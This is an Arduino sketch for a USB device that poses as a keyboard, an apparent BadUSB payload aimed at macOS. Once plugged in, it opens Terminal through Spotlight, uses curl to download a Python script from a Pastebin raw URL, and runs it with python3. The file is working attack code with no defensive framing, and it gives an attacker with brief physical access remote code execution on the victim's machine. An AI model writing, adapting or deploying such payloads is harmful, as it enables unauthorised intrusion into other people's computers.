#include <HID.h>

#include <HID-Project.h> // Install this library
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(800);

  Keyboard.print("Terminal");

  delay(500);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("curl https://pastebin.com/raw/3HXXRDRQ > client.py");

  delay(500);
  
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("python3 client.py");

  delay(500);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);
  
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
